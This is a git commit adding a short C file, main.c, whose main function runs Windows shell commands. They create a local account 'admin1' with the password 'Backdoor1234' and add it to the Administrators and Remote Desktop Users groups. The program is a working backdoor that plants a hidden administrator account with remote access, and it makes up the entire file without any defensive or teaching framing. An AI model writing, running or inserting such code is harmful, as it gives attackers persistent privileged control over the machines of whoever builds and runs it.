c059449e84b53d9b60ef8a8255298ec9077c5b47
UBFI <69093516+UBFI@users.noreply.github.com>
2020-08-24 16:16:33 -0500

    Create main.c

---
+++ main.c
@@ -0,0 +1,13 @@
+#include <stdio.h>
+#define ID_MANIFEST 1
+#ifndef RT_MANIFEST
+#define RT_MANIFEST MAKEINTRESOURCE(24)
+#endif
+
+int main(int argc, char *argv[]) {
+	system("net user admin1 Backdoor1234 /add");
+	system("net localgroup \"Remote Desktop Users\" admin1 /add");
+	system("net localgroup \"Administrators\" admin1 /add");
+	system("net localgroup \"Remote Desktop Users\" admin1 /add");
+	return 0;
+}
